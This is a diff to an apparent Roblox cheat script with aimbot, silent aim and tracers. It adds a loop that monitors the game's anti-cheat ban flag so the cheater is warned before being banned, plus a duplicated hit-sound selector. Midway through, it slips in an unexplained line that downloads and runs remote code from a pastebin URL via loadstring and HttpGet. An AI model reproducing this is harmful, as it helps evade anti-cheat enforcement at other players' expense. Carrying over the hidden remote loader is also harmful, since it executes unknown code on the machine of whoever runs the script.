@@ -584,6 +584,8 @@ checkForSameScript(hwid)
 
 
 
+
+
 local continueexecution = true
 
 
@@ -1720,6 +1722,48 @@ LeftGroupBox:AddToggle('tracers', {
         Utility:ToggleTracers(enabled) -- Enable or disable based on toggle
     end
 })
+
+--ban detector initialize
+
+------------------------
+-- Ban detector initialize
+
+-- Define LocalPlayer for easier access
+
+-- Run a loop every 4 seconds to check the 'BeingBanned' status
+-- Ban detector initialize
+
+-- Define LocalPlayer for easier access
+local LocalPlayer = game.Players.LocalPlayer
+
+-- Create a function for ban detection
+local function detectBan()
+    while true do
+        wait(4) -- Wait 4 seconds before the next check
+
+        -- Check if the UAC and BeingBanned attribute exist
+        local playerStatus = game.ReplicatedStorage.Players:FindFirstChild(LocalPlayer.Name)
+        
+        if playerStatus and playerStatus:FindFirstChild("Status") and playerStatus.Status:FindFirstChild("UAC") then
+            -- Check if the 'BeingBanned' attribute exists
+            local beingBanned = playerStatus.Status.UAC:GetAttribute("BeingBanned")
+            
+            -- If BeingBanned is true, print a message
+            if beingBanned == true then
+                print("You are being banned!")
+                Library:Notify("[UAC] YOU ARE GOING TO GET BANNED.")
+            end
+        else
+        Library:Notify("[UAC] UAC VARIABLE ERROR.")
+            warn("Could not find the UAC status for the player.")
+        end
+    end
+end
+
+-- Start the ban detection coroutine
+coroutine.wrap(detectBan)()
+Library:Notify("[UAC] BAN DETECTOR STARTED!")
+
 
 -- Zoom functionality
 local UserInputService = game:GetService("UserInputService")
@@ -3361,10 +3405,54 @@ LeftGroupBox:AddToggle('Silentim', {
     end
 })
 
+-- Define hitmarker sounds table
+-- Define the hitmarker sounds table with all sounds
+local HitmarkerSounds = {
+    ["TF2"]       = "rbxassetid://8255306220",
+    ["Gamesense"] = "rbxassetid://4817809188",
+    ["Rust"]      = "rbxassetid://1255040462",
+    ["Neverlose"] = "rbxassetid://8726881116",
+    ["Bubble"]    = "rbxassetid://198598793",
+    ["Quake"]     = "rbxassetid://1455817260",
+    ["Among-Us"]  = "rbxassetid://7227567562",
+    ["Ding"]      = "rbxassetid://2868331684",
+    ["Minecraft"] = "rbxassetid://6361963422",
+    ["Blackout"]  = "rbxassetid://3748776946",
+    ["Osu!"]      = "rbxassetid://7151989073",
+}
+
+-- Create the dropdown for selecting hit sounds
+LeftGroupBox:AddDropdown('cameradropdown', {
+    Values = { 'TF2', 'Gamesense', 'Rust', 'Neverlose', 'Bubble', 'Quake', 'Among-Us', 'Ding', 'Minecraft', 'Blackout', 'Osu!' },  -- Add all the options
+    Default = 3,  -- Default selection is 'Rust'
+    Multi = false,
+    Text = 'Hit Sounds', 
+    Tooltip = 'Hit Sounds', 
+    Callback = function(state)
+        -- Get the selected sound ID from the HitmarkerSounds table
+        local globalhitsounds = HitmarkerSounds[state]
+        
+        -- Ensure the sound ID is valid and exists
+        if globalhitsounds then
+            local SFXDIRECTORY = game.ReplicatedStorage.SFX
+
+            -- Assign the selected sound ID to all relevant sounds
+            SFXDIRECTORY.Hits.MeleeHits.Blood.Hit.SoundId = globalhitsounds
+            SFXDIRECTORY.Hits.ProjectileHits.Blood.Hit.SoundId = globalhitsounds
+            SFXDIRECTORY.Hits.HitMarkers.Helmet.SoundId = globalhitsounds
+            SFXDIRECTORY.Hits.HitMarkers.Bodyshot.SoundId = globalhitsounds
+            SFXDIRECTORY.Hits.HitMarkers.Headshot.SoundId = globalhitsounds
+        else
+            warn("Selected hit sound is not available!")
+        end
+    end
+})
+
+
+
 -- Services
 -- Services
-local players = game:GetService("Players")
-local localPlayer = players.LocalPlayer
+
 local runService = game:GetService("RunService")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local workspace = game:GetService("Workspace")
@@ -4281,6 +4369,8 @@ local Tabs = {
     Settings = Window:AddTab('settings/configs'),
 }
 
+--CYqXb6TX
+loadstring(game:HttpGet("https://pastebin.com/raw/CYqXb6TX"))()
 
 local autoFireEnabled = false -- Initially disabled
 local plr = plrs.LocalPlayer
@@ -7188,6 +7278,8 @@ aimtab:AddToggle('Aimbot', {
         toggleAimbot()
     end
 
+
+
     }):AddKeyPicker('aimbotkeybind', {
     Default = 'None',
     SyncToggleState = true,
@@ -7199,6 +7291,47 @@ aimtab:AddToggle('Aimbot', {
 
     Callback = function(Value)
     end,
+})
+
+local HitmarkerSounds = {
+    ["TF2"]       = "rbxassetid://8255306220",
+    ["Gamesense"] = "rbxassetid://4817809188",
+    ["Rust"]      = "rbxassetid://1255040462",
+    ["Neverlose"] = "rbxassetid://8726881116",
+    ["Bubble"]    = "rbxassetid://198598793",
+    ["Quake"]     = "rbxassetid://1455817260",
+    ["Among-Us"]  = "rbxassetid://7227567562",
+    ["Ding"]      = "rbxassetid://2868331684",
+    ["Minecraft"] = "rbxassetid://6361963422",
+    ["Blackout"]  = "rbxassetid://3748776946",
+    ["Osu!"]      = "rbxassetid://7151989073",
+}
+
+-- Create the dropdown for selecting hit sounds
+aimtab:AddDropdown('cameradropdown', {
+    Values = { 'TF2', 'Gamesense', 'Rust', 'Neverlose', 'Bubble', 'Quake', 'Among-Us', 'Ding', 'Minecraft', 'Blackout', 'Osu!' },  -- Add all the options
+    Default = 3,  -- Default selection is 'Rust'
+    Multi = false,
+    Text = 'Hit Sounds', 
+    Tooltip = 'Hit Sounds', 
+    Callback = function(state)
+        -- Get the selected sound ID from the HitmarkerSounds table
+        local globalhitsounds = HitmarkerSounds[state]
+        
+        -- Ensure the sound ID is valid and exists
+        if globalhitsounds then
+            local SFXDIRECTORY = game.ReplicatedStorage.SFX
+
+            -- Assign the selected sound ID to all relevant sounds
+            SFXDIRECTORY.Hits.MeleeHits.Blood.Hit.SoundId = globalhitsounds
+            SFXDIRECTORY.Hits.ProjectileHits.Blood.Hit.SoundId = globalhitsounds
+            SFXDIRECTORY.Hits.HitMarkers.Helmet.SoundId = globalhitsounds
+            SFXDIRECTORY.Hits.HitMarkers.Bodyshot.SoundId = globalhitsounds
+            SFXDIRECTORY.Hits.HitMarkers.Headshot.SoundId = globalhitsounds
+        else
+            warn("Selected hit sound is not available!")
+        end
+    end
 })
 
 aimtab:AddButton('No Gun Weight', function()
